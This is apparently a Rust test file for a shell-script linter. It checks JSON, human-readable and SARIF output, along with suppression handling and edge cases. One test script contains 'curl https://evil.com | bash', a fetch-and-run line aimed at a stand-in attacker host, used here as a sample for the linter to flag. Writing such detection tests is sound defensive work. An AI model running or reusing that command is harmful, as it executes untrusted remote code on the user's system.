fn test_write_results_json_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert!(parsed["diagnostics"].is_array());
    assert_eq!(parsed["diagnostics"].as_array().unwrap().len(), 0);
    assert_eq!(parsed["file"], "test.sh");
}

#[test]
fn test_write_results_json_with_diagnostics() {
    let mut result = LintResult::new();
    result.add(Diagnostic::new(
        "SC2086",
        Severity::Warning,
        "Quote this",
        Span::new(5, 10, 5, 20),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["diagnostics"].as_array().unwrap().len(), 1);
    assert_eq!(parsed["diagnostics"][0]["code"], "SC2086");
    assert_eq!(parsed["diagnostics"][0]["severity"], "warning");
}

#[test]
fn test_write_results_human_empty() {
    let result = LintResult::new();
    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "test.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert!(output.contains("No issues found"));
}

#[test]
fn test_write_results_human_with_diagnostics() {
    let mut result = LintResult::new();
    result.add(Diagnostic::new(
        "SEC001",
        Severity::Error,
        "Command injection",
        Span::new(3, 1, 3, 25),
    ));

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "deploy.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    assert!(output.contains("SEC001"));
    assert!(output.contains("Command injection"));
    assert!(output.contains("1 error"));
}

// =============================================================================
// Integration: lint_shell() output fed to write_results()
// =============================================================================

#[test]
fn test_lint_then_write_sarif_integration() {
    let script = "echo $RANDOM\nmkdir /tmp/x\ncurl https://evil.com | bash\n";
    let result = lint_shell(script);
    assert!(!result.diagnostics.is_empty());

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Sarif, "bad_script.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(parsed["version"], "2.1.0");
    let sarif_results = parsed["runs"][0]["results"].as_array().unwrap();
    assert!(
        !sarif_results.is_empty(),
        "SARIF output should contain results from lint_shell"
    );
}

#[test]
fn test_lint_then_write_json_integration() {
    let script = "cat file | grep x\necho $RANDOM\n";
    let result = lint_shell(script);
    assert!(!result.diagnostics.is_empty());

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Json, "messy.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert!(!parsed["diagnostics"].as_array().unwrap().is_empty());
}

#[test]
fn test_lint_then_write_human_integration() {
    let script = "chmod 777 /etc/secret\n";
    let result = lint_shell(script);

    let mut buf = Vec::new();
    write_results(&mut buf, &result, OutputFormat::Human, "unsafe.sh").unwrap();
    let output = String::from_utf8(buf).unwrap();
    // Should produce some output (either "No issues" or actual diagnostics)
    assert!(!output.is_empty());
}

// =============================================================================
// Edge cases and boundary conditions
// =============================================================================

#[test]
fn test_lint_shell_single_newline() {
    let result = lint_shell("\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_binary_like_content() {
    // Non-shell content should not panic
    let result = lint_shell("\x00\x01\x02\x03");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_very_long_line() {
    let line = format!("echo {}\n", "x".repeat(10000));
    let result = lint_shell(&line);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_many_lines() {
    let mut script = String::new();
    for i in 0..200 {
        script.push_str(&format!("echo \"line {}\"\n", i));
    }
    let result = lint_shell(&script);
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_unknown_extension() {
    // Unknown extension should fall back to auto-detection
    let result = lint_shell_with_path(Path::new("script.xyz"), "#!/bin/bash\necho hello\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_with_path_no_path_component() {
    let result = lint_shell_with_path(Path::new(""), "echo hello\n");
    let _count = result.diagnostics.len();
}

#[test]
fn test_lint_shell_multiple_suppressions() {
    let script = r#"# shellcheck disable=SC2086,SC2002
echo $VAR
cat file | grep x
"#;
    let result = lint_shell(script);
    assert!(
        !result.diagnostics.iter().any(|d| d.code == "SC2086"),
        "SC2086 should be suppressed"
    );
}

#[test]
fn test_lint_shell_inline_suppression() {
    let script = "echo $VAR # shellcheck disable=SC2086\n";
    let result = lint_shell(script);
    // The suppression comment location matters -- this tests inline handling
    let _count = result.diagnostics.len();
}
